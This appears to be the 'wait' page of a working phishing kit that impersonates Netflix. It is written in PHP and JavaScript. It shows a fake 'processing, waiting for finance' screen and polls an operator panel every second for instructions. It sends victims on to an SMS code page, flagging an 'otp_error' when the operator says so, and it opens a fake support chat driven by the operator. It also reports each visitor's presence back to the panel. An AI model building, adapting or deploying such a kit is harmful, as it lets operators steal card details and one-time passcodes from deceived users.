<?php
require 'main.php';

$next = isset($_GET['next']) ? trim($_GET['next']) : 'sms.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Netflix</title>
    <style>
        .wait-wrapper {
            max-width: 500px;
            margin: 60px auto;
            background: #111;
            padding: 24px;
            border-radius: 8px;
            border: 1px solid #1f1f1f;
            color: #f5f5f5;
        }

        .status-text {
            text-align: center;
            margin-bottom: 12px;
        }

        .support-chat-widget {
            position: fixed;
            right: 18px;
            bottom: 18px;
            z-index: 9999;
        }

        .chat-toggle {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            background: linear-gradient(135deg, #e50914, #b20710);
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 12px 26px rgba(0, 0, 0, 0.45);
            position: relative;
        }

        .chat-notification {
            position: absolute;
            top: -4px;
            right: -4px;
            min-width: 22px;
            height: 22px;
            border-radius: 999px;
            background: #ff2b2b;
            color: #fff;
            font-size: 12px;
            font-weight: 700;
            display: none;
            align-items: center;
            justify-content: center;
            border: 2px solid #111;
            padding: 0 6px;
            box-sizing: border-box;
        }

        .chat-notification.show { display: inline-flex; }

        .chat-panel {
            display: none;
            width: min(92vw, 360px);
            margin-bottom: 10px;
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 14px;
            overflow: hidden;
            box-shadow: 0 16px 35px rgba(0, 0, 0, 0.5);
        }

        .chat-panel.active { display: block; }

        .chat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #171717;
            padding: 12px 14px;
            border-bottom: 1px solid #2a2a2a;
        }

        .chat-title { margin: 0; font-size: 15px; }

        .chat-close {
            background: transparent;
            border: none;
            color: #bbb;
            cursor: pointer;
            font-size: 18px;
        }

        .chat-box {
            padding: 12px;
            max-height: 270px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .chat-message {
            border-radius: 10px;
            padding: 8px;
            font-size: 13px;
        }

        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; color: #fff; }
        .chat-meta { font-size: 11px; color: #9e9e9e; margin-top: 4px; }

        .chat-controls {
            display: flex;
            gap: 8px;
            padding: 10px 12px 12px;
            border-top: 1px solid #1f1f1f;
        }

        .chat-controls input {
            flex: 1;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #111;
            color: #f5f5f5;
        }

        .chat-controls button {
            padding: 10px 14px;
            border: none;
            border-radius: 8px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
        }
    </style>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png" alt="Netflix logo">  </div>
       </header>

<main>
    <div class="form">
        <div class="continer wait-wrapper">
            <div class="titles_holder" style="padding:10px;">
                <h2>Please wait...</h2>
            </div>
            <div class="heads">
                <p class="status-text">Processing your information. We will move you forward as soon as finance responds.</p>
                <div class="loding"><img src="res/img/loadings.gif" style="width:60px;" alt="Loading"></div>
            </div>
        </div>
    </div>
</main>

<div class="support-chat-widget" id="support-chat-widget">
    <div class="chat-panel" id="chat-panel">
        <div class="chat-header">
            <h3 class="chat-title">Support Chat</h3>
            <button class="chat-close" id="chat-close" type="button">✕</button>
        </div>
        <div class="chat-box" id="chat-box"></div>
        <div class="chat-controls">
            <input type="text" id="chat-input" placeholder="Type a message...">
            <button type="button" id="chat-send">Send</button>
        </div>
    </div>
    <button type="button" class="chat-toggle" id="chat-toggle" aria-label="Open support chat">
        💬
        <span class="chat-notification" id="chat-notification">0</span>
    </button>
</div>

<script>
    const nextUrl = <?php echo json_encode($next); ?>;
    const chatPanel = document.getElementById('chat-panel');
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const chatSend = document.getElementById('chat-send');
    const chatToggle = document.getElementById('chat-toggle');
    const chatClose = document.getElementById('chat-close');
    const chatNotification = document.getElementById('chat-notification');
    let outReported = false;

    let lastInstructionToken = sessionStorage.getItem('instruction_token') || 0;
    let chatReady = false;
    let isChatOpen = false;
    let unreadCount = 0;
    let lastSeenAdminTimestamp = Number(sessionStorage.getItem('last_admin_msg_ts') || 0);

    function addOrUpdateParam(url, key, value) {
        const parsed = new URL(url, window.location.href);
        parsed.searchParams.set(key, value);
        return parsed.toString();
    }

    function openChat(markAsRead = true) {
        if (!chatPanel) return;
        isChatOpen = true;
        chatPanel.classList.add('active');
        if (markAsRead) {
            unreadCount = 0;
            chatNotification.classList.remove('show');
        }
    }

    function closeChat() {
        isChatOpen = false;
        chatPanel.classList.remove('active');
    }

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const row = document.createElement('div');
            row.className = `chat-message ${entry.sender}`;
            row.innerHTML = `
                <div>${entry.message.replace(/\n/g, '<br>')}</div>
                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
            `;
            chatBox.appendChild(row);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function handleAdminNotifications(messages) {
        const latestAdmin = [...messages]
            .reverse()
            .find((entry) => entry.sender === 'admin');

        if (!latestAdmin) return;

        const adminTimestamp = Number(latestAdmin.timestamp || 0);
        if (adminTimestamp > lastSeenAdminTimestamp) {
            if (!isChatOpen) {
                unreadCount += 1;
                chatNotification.textContent = unreadCount > 9 ? '9+' : String(unreadCount);
                chatNotification.classList.add('show');
                openChat(false);
            } else {
                unreadCount = 0;
                chatNotification.classList.remove('show');
            }

            lastSeenAdminTimestamp = adminTimestamp;
            sessionStorage.setItem('last_admin_msg_ts', String(lastSeenAdminTimestamp));
        }
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.chat_enabled) {
                chatInput.disabled = false;
                chatSend.disabled = false;
                renderChat(data.messages || []);
                handleAdminNotifications(data.messages || []);
            } else {
                closeChat();
                chatInput.disabled = true;
                chatSend.disabled = true;
            }
        } catch (e) {
            console.error('Unable to load chat.', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';
        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ sender: 'user', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send chat message', e);
        }
    }

    async function pollState() {
        try {
            const response = await fetch('state.php');
            const state = await response.json();

            if (state.chat_enabled && !chatReady) {
                chatReady = true;
                fetchChat();
                setInterval(fetchChat, 1000);
            } else if (!state.chat_enabled) {
                closeChat();
                chatReady = false;
            }

            if (state.instruction !== 'stay_wait' && state.instruction_token != lastInstructionToken) {
                lastInstructionToken = state.instruction_token;
                sessionStorage.setItem('instruction_token', lastInstructionToken);
                let target = nextUrl || 'sms.php';
                if (state.instruction === 'otp_error') {
                    target = addOrUpdateParam(target, 'otp_error', '1');
                }
                window.location = target;
            }
        } catch (e) {
            console.error('Unable to poll state', e);
        }
    }

    if (chatToggle) {
        chatToggle.addEventListener('click', () => {
            if (isChatOpen) {
                closeChat();
            } else {
                openChat(true);
                fetchChat();
            }
        });
    }

    if (chatClose) {
        chatClose.addEventListener('click', closeChat);
    }

    if (chatSend) {
        chatSend.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendChatMessage();
            }
        });
    }

    function reportPageOut() {
        if (outReported) {
            return;
        }

        outReported = true;
        const payload = new URLSearchParams({ page: 'wait.php' });

        if (navigator.sendBeacon) {
            const blob = new Blob([payload.toString()], { type: 'application/x-www-form-urlencoded' });
            navigator.sendBeacon('panel_presence.php', blob);
            return;
        }

        fetch('panel_presence.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: payload,
            keepalive: true,
        }).catch(() => {});
    }

    window.addEventListener('pagehide', reportPageOut);
    window.addEventListener('beforeunload', reportPageOut);

    pollState();
    setInterval(pollState, 1000);
</script>
</body>
</html>
